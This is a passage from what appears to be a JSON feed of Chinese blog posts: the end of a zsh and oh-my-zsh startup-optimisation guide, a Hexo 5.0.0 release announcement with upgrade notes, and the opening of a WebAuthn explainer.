pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 